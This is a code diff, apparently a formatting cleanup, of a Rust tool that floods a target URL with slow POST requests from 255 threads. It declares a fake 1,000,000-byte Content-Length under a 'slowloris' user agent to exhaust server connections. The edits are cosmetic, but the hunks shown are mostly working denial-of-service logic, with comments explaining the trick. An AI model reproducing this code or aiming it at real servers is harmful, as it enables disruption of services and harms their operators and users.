@@ -7,7 +7,6 @@ use curl::easy::{Easy, List};
 static WORKERS: i32 = 255;
 
 fn main() {
-
     let mut minions = vec![];
     let args: Vec<String> = env::args().collect();
 
@@ -17,7 +16,6 @@ fn main() {
     println!("Target: {}", target_url);
 
     for i in 0..WORKERS {
-
         // We need to copy the target_url here because curl needs a mutable
         // reference? And we can't give the same mutable reference to several
         // threads? Not sure TBH.
@@ -36,13 +34,15 @@ fn main() {
                 headers.append("User-Agent: slowloris").unwrap();
                 // Here's the trick - slowloris tells the server that it's
                 // posting really big content.
-                headers.append("Content-Type: application/x-www-form-urlencoded").unwrap();
+                headers
+                    .append("Content-Type: application/x-www-form-urlencoded")
+                    .unwrap();
                 headers.append("Content-Length: 1000000").unwrap();
                 curl.http_headers(headers).unwrap();
 
                 // Tell curl it's a post.
                 curl.post(true).unwrap();
-                println!("Performing POST to {} from minion {}", inner_url ,i);
+                println!("Performing POST to {} from minion {}", inner_url, i);
                 // Actually send the request
                 curl.perform().unwrap();
                 thread::sleep(Duration::from_millis(1000));
